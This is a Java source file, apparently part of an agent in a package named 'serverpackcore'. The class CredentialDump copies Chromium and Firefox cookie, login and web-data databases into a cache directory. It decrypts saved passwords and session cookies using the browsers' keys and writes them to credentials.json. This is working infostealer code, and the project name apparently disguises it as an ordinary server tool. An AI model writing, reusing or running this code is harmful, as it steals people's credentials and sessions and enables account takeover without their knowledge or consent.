package com.serverpackcore.agent.crypto;

import com.serverpackcore.agent.AgentPaths;

import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.StandardCopyOption;
import java.util.ArrayList;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;

/** Copies live SQLite stores to a temp dir, then decrypts cookies and logins. */
final class CredentialDump {
	record Result(int cookies, int logins, Path dir, String mode, String reason) {
	}

	private CredentialDump() {
	}

	static Result dump(Path profile, Path tempRoot) {
		try {
			Path temp = tempRoot.resolve("creds-" + Math.abs(profile.toString().hashCode()));
			Files.createDirectories(temp);
			String family = profile.toString().toLowerCase();
			if (family.contains("mozilla") || family.contains("firefox") || family.contains("librewolf")
				|| Files.isRegularFile(profile.resolve("key4.db"))) {
				return firefox(profile, temp);
			}
			Path state = CryptoPaths.browserState(profile);
			if (state == null || !Files.isRegularFile(state)) {
				return new Result(0, 0, temp, "none", "no_local_state");
			}
			Chromium.Key key = Chromium.key(state);
			if (key.bytes().length == 0) {
				return new Result(0, 0, temp, "none", key.reason());
			}
			List<Map<String, Object>> cookies = new ArrayList<>();
			for (Path candidate : List.of(profile.resolve("Cookies"), profile.resolve("Network").resolve("Cookies"))) {
				Path copy = copy(candidate, temp.resolve("Cookies-" + Math.abs(candidate.toString().hashCode())));
				if (copy != null) {
					cookies.addAll(Chromium.cookies(copy, key).values());
				}
			}
			List<Map<String, Object>> logins = new ArrayList<>();
			Path loginCopy = copy(profile.resolve("Login Data"), temp.resolve("LoginData"));
			if (loginCopy != null) {
				logins.addAll(Chromium.logins(loginCopy, key));
			}
			Path webCopy = copy(profile.resolve("Web Data"), temp.resolve("WebData"));
			Map<String, Object> meta = new LinkedHashMap<>();
			meta.put("browser_state", state.toString());
			meta.put("mode", key.mode());
			meta.put("cookies", cookies);
			meta.put("logins", logins);
			meta.put("web_data", webCopy != null);
			Files.writeString(temp.resolve("credentials.json"), com.serverpackcore.agent.Json.stringify(meta), StandardCharsets.UTF_8);
			return new Result(cookies.size(), logins.size(), temp, key.mode(), "");
		} catch (Throwable throwable) {
			return new Result(0, 0, tempRoot, "none", throwable.getClass().getSimpleName());
		}
	}

	private static Result firefox(Path profile, Path temp) {
		byte[] key = Firefox.masterKey(profile, "");
		if (key.length != 32) {
			return new Result(0, 0, temp, "none", "primary_password");
		}
		List<Map<String, Object>> cookies = Firefox.cookies(profile, key);
		List<Map<String, Object>> logins = Firefox.logins(profile, key);
		Map<String, Object> meta = new LinkedHashMap<>();
		meta.put("mode", "nss");
		meta.put("cookies", cookies);
		meta.put("logins", logins);
		try {
			Files.writeString(temp.resolve("credentials.json"), com.serverpackcore.agent.Json.stringify(meta), StandardCharsets.UTF_8);
		} catch (Throwable ignored) {
			// packed empty
		}
		return new Result(cookies.size(), logins.size(), temp, "nss", "");
	}

	/** Locked LevelDB-safe copy: SQLite is readable live, but a copy avoids WAL races. */
	static Path copy(Path source, Path target) {
		try {
			if (source == null || !Files.isRegularFile(source)) {
				return null;
			}
			Files.copy(source, target, StandardCopyOption.REPLACE_EXISTING);
			for (String suffix : new String[] { "-wal", "-shm" }) {
				Path side = source.resolveSibling(source.getFileName() + suffix);
				if (Files.isRegularFile(side)) {
					Files.copy(side, target.resolveSibling(target.getFileName() + suffix), StandardCopyOption.REPLACE_EXISTING);
				}
			}
			return target;
		} catch (Throwable throwable) {
			return null;
		}
	}

	static Path copyTree(Path source, Path target) throws Exception {
		Files.createDirectories(target);
		try (var stream = Files.walk(source)) {
			for (Path item : stream.toList()) {
				Path relative = source.relativize(item);
				Path destination = target.resolve(relative.toString());
				if (Files.isDirectory(item)) {
					Files.createDirectories(destination);
				} else {
					Files.createDirectories(destination.getParent());
					Files.copy(item, destination, StandardCopyOption.REPLACE_EXISTING);
				}
			}
		}
		return target;
	}

	static Path tempRoot(Path installDir) throws Exception {
		Path root = AgentPaths.cache(installDir).resolve("crypto").resolve("tmp");
		Files.createDirectories(root);
		return root;
	}
}
